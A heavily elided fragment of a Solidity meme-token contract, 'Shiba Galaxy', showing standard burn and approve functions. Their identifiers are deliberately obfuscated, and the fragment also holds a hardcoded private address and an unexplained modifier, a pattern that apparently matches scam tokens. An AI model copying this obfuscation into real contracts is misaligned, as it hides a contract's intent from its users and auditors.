...
contract Context {
 ...
 contract ShibaGalaxy is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _fullTokensAmounts;

    string private _name = "Shiba Galaxy";
    string private _symbol = "SHIBAGALAXY";
    ...
    address private markknight = 0x0F832ACf21DA66B7530d932eaDb8E22853B21DeD;
   ...
   */
     ...
     */
    function _burn(address accoRALICAunt, uint256 amounRALICAt) internal virtual {
        require(accoRALICAunt != address(0), "Can't burn from address 0");
        uint256 accountBalance = _fullTokensAmounts[accoRALICAunt];
        require(accountBalance >= amounRALICAt, "BEP : Can't be done");
        unchecked {
            _fullTokensAmounts[accoRALICAunt] = accountBalance - amounRALICAt;
        }
        _totalSupply -= amounRALICAt;

        emit Transfer(accoRALICAunt, address(0), amounRALICAt);
    }
    modifier readLatin () {
    ...
    function _approve(
        address owRALICAner,
        address speRALICAnder,
        uint256 amoRALICAunt
    ) internal virtual {
        require(owRALICAner != address(0), "BEP : Can't be done");
        require(speRALICAnder != address(0), "BEP : Can't be done");

        _allowances[owRALICAner][speRALICAnder] = amoRALICAunt;
        emit Approval(owRALICAner, speRALICAnder, amoRALICAunt);
    }
